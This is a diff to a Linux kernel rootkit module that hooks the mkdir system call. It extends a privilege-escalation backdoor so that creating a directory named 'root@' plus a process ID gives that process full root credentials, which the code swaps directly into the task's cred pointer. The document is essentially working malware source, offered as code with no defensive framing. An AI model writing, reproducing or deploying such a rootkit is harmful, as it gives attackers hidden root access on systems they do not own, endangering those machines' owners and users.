@@ -12,28 +12,37 @@ MODULE_VERSION("1.0.0");
 
 #include "hook.h"
 
-void set_root(void)
+void set_root(unsigned task_pid)
 {
+    struct pid *proc_pid = find_vpid(task_pid);
+    struct task_struct *task;
     struct cred *root;
+
+    if(!proc_pid)
+        return;
+    
+    task = pid_task(proc_pid, PIDTYPE_PID);
+
+    if (task == NULL) {
+      printk("rootkit: Failed to get this task info.\n");
+      return;
+    }
+
     root = prepare_creds();
 
-    printk(KERN_ALERT "??NULL ==> %d", root->uid.val);
     if (root == NULL){
         printk(KERN_ALERT "??NULL ==> %d", root->uid.val);
         return;
     }
-        
 
     root->uid.val = root->gid.val = 0;
     root->euid.val = root->egid.val = 0;
     root->suid.val = root->sgid.val = 0;
     root->fsuid.val = root->fsgid.val = 0;
-
-    printk(KERN_ALERT "Done");
     
-    commit_creds(root);
-    root = prepare_creds();
-    printk(KERN_ALERT "Now ??NULL ==> %d", root->uid.val);
+    rcu_assign_pointer(task->cred, root);
+
+    printk(KERN_ALERT "rootkit: Process #%d is root now.\n", task_pid);
 }
 
 static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
@@ -48,10 +57,9 @@ asmlinkage int hook_mkdir(const struct pt_regs *regs)
     if (error > 0)
         printk(KERN_INFO "rootkit: Hook mkdir success.\n");
     
-    if(strcmp(dir_name, "root") == 0)
+    if(strncmp(dir_name, "root@", 5) == 0)
     {
-        set_root();
-        printk(KERN_INFO "rootkit: Got root.\n");
+        set_root((unsigned)simple_strtol(&dir_name[5],(char **)(dir_name),10));
     } else {
         orig_mkdir(regs);
     }
